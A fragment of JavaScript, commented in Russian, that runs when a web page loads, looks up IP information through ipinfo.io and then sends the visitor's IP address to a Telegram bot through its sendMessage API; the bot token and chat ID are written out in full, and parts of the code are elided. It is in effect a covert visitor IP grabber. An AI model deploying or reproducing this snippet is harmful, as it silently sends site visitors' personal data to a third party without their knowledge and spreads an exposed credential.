window.onload = function() {
    ...
    fetch('https://ipinfo.io/2.134.77.153?token=c0c78c76ac0ca3')  // Замените на ваш токен для получения IP
        ...
        .then(data => {
            ...
            fetch('https://api.telegram.org/bot8178967594:AAFos-m53_Q6f0mBoEdvVhq0FH5V4jUOkdM/sendMessage?chat_id=1163463444&text=<'+data.ip+'>', {  // Адрес для отправки данных в бота
                method: 'POST',
                headers: {
